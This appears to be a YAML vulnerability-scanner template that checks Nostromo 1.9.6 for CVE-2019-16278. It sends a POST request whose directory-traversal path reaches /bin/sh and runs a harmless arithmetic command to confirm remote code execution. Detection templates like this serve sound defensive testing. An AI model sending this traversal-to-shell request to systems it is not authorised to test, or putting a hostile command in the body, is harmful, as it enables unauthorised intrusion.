name: yaml-poc-nazgul-nostromo-directory_traversal-CVE-2019-16278
binding: e93d397b-e1f7-4c25-80b8-1fa5e914277e
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html
        - http://packetstormsecurity.com/files/155802/nostromo-1.9.6-Remote-Code-Execution.html
        - http://www.nazgul.ch/dev/nostromo_cl.txt
        - httpd-exploits
        - https://git.sp0re.sh/sp0re/N
        - https://git.sp0re.sh/sp0re/Nhttpd-exploits
        - https://nvd.nist.gov/vuln/detail/CVE-2019-16278
        - https://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html
        - https://packetstormsecurity.com/files/155802/nostromo-1.9.6-Remote-Code-Execution.html
        - https://sp0re.sh
        - https://www.exploit-db.com/exploits/47573
    vulnerability:
        id: a98acb32-4be0-44fb-8e2b-d614a9b893aa
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(800000000, 1000000000)
    r2: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                echo
                echo
                expr {{r1}} + {{r2}} 2>&1
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0()
